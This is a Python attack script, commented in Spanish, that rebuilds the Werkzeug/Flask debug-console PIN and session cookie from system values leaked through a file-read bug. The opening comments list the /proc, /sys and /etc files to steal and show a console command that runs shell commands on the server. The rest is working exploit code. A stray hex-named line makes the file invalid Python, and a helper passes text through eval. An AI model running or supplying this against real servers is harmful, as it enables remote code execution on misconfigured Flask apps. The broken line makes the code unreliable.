#!/usr/bin/env python3

# Para calcular el PIN que usa la consola de Flask cuando tiene Debug activado

# Username
#   /proc/self/status
# Path
#   /proc/self/cmdline > /proc/self/cwd
# Direccion mac
#   /sys/class/net/eth0/address
# machine_id (boot_id)
#   Para MVs o baremetal:
#     /etc/machine-id
#   Para docker, boot id del kernel
#     /proc/sys/kernel/random/boot_id
# CGroup
#   /proc/self/cgroup
1b2cba8365de790bbb1e3dabcacdede935745e393288fd48f64b985cb52dad11.txt
# Ejemplo de uso
# python3 /tmp/prueba.py --username 'web-app' --path '/home/web-app/.local/lib/python3.11/site-packages/flask/app.py' --mac '02:42:ac:10:00:0f' --machine_id '7fe0a9b7-e295-4b49-8ae7-338c9825049e' --cgroup '12:cpuset:/'
# Ingresar el pin en la consola, y luego:
#
# __import__('os').popen('ls -la').read()
#
#

import hashlib
from itertools import chain
from colorama import Fore, Style
import time
import argparse
import getpass
import uuid
import sys


def fHashPin(vPin: str) -> str:
  vPin = vPin[0]
  return hashlib.sha1(f"{vPin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


def fGenPin(vUsername, vMac, vMachineId, vPath, vModName, vAppName):
  vProbablyPublicBits = [vUsername, vModName, vAppName, vPath]
  vPrivateBits = [str(vMac), vMachineId]

  vRv = None
  vNum = None
  vHash = hashlib.sha1()

  for vBit in chain(vProbablyPublicBits, vPrivateBits):
    if not vBit:
      continue
    if isinstance(vBit, str):
      vBit = vBit.encode("utf-8")
    vHash.update(vBit)

  vHash.update(b"cookiesalt")
  vCookieName = f"__wzd{vHash.hexdigest()[:20]}"

  if vNum is None:
    vHash.update(b"pinsalt")
    vNum = f"{int(vHash.hexdigest(), 16):09d}"[:9]

  if vRv is None:
    for vGroupSize in 5, 4, 3:
      if len(vNum) % vGroupSize == 0:
        vRv = "-".join(
          vNum[vX:vX + vGroupSize].rjust(vGroupSize, "0")
          for vX in range(0, len(vNum), vGroupSize)
        )
        break
    else:
      vRv = vNum

  return [vRv, vCookieName]


def fGenerateCookie(vPin):
  vCookie = ''
  vCookie += str(int(time.time()))
  vCookie += '|'
  vCookie += fHashPin([vPin])
  return vCookie


def fLogo():
  print("""
[ LOGO OMITIDO PARA BREVEDAD ]
""")


def fPrintC(vText, vColor):
  eval(f'print(Fore.{vColor} + """{vText}""" + Style.RESET_ALL, end="")')


def fMain():
  fLogo()

  if len(sys.argv) > 1:
    if sys.argv[1] == "GET":
      with open('/etc/machine-id', 'r') as vFile:
        vMachineId = vFile.readline()[:-1]

      with open("/proc/self/cgroup", 'r') as vFile:
        vCgroup = vFile.readline()[:-1]

      print(f"""
Public bits:
username         === {getpass.getuser()}

Private bits:
MAC              === {str(uuid.getnode())}
machine_id       === {vMachineId}
cgroup           === {vCgroup}
""")
      exit(0)

  vParser = argparse.ArgumentParser(description="Werkzeug generate PIN script")

  vParser.add_argument("--username", dest="vUsername", type=str, help="Username", default='www-data')
  vParser.add_argument("--path", dest="vPath", required=True, type=str, help="Path to Flask")
  vParser.add_argument("--modname", dest="vModName", type=str, help="Modname (Default: flask.app)")
  vParser.add_argument("--appname", dest="vAppName", type=str, help="Appname (Default: Flask)")

  vParser.add_argument("--mac", dest="vMac", required=True, type=str, help="MAC address")
  vParser.add_argument("--machine_id", dest="vMachineId", required=True, type=str, help="machine-id or boot_id")
  vParser.add_argument("--cgroup", dest="vCgroup", required=True, type=str, help="cgroup")

  vArgs = vParser.parse_args()

  cModNames = ["flask.app", "werkzeug.debug"]
  cAppNames = ["wsgi_app", "DebuggedApplication", "Flask"]

  if vArgs.vAppName:
    cAppNames.append(vArgs.vAppName)

  if vArgs.vModName:
    cModNames.append(vArgs.vModName)

  vMachineId = b""
  vMachineId += vArgs.vMachineId.encode("UTF-8")

  vCgroupFile = vArgs.vCgroup.strip().rpartition("/")[2].encode("UTF-8")
  vMachineId += vCgroupFile

  vMac = int("".join(vArgs.vMac.split(":")), 16)

  for vMod in cModNames:
    for vApp in cAppNames:
      vResult = fGenPin(vArgs.vUsername, vMac, vMachineId, vArgs.vPath, vMod, vApp)
      vCookie = fGenerateCookie(vResult[0])

      if vResult[0] != '' and vResult[1] != '':
        fPrintC("[+] Success!", "GREEN")
        print(f"""
[*] PIN: {vResult[0]}
[*] Cookie: {vResult[1]}={vCookie}
[*] Modname: {vMod}
[*] Appname: {vApp}
        """)
      else:
        print("[-] Error!")

  fPrintC(f"[+] {len(cModNames) * len(cAppNames)} payloads are successfully generated!\n", "GREEN")


if __name__ == "__main__":
  fMain()
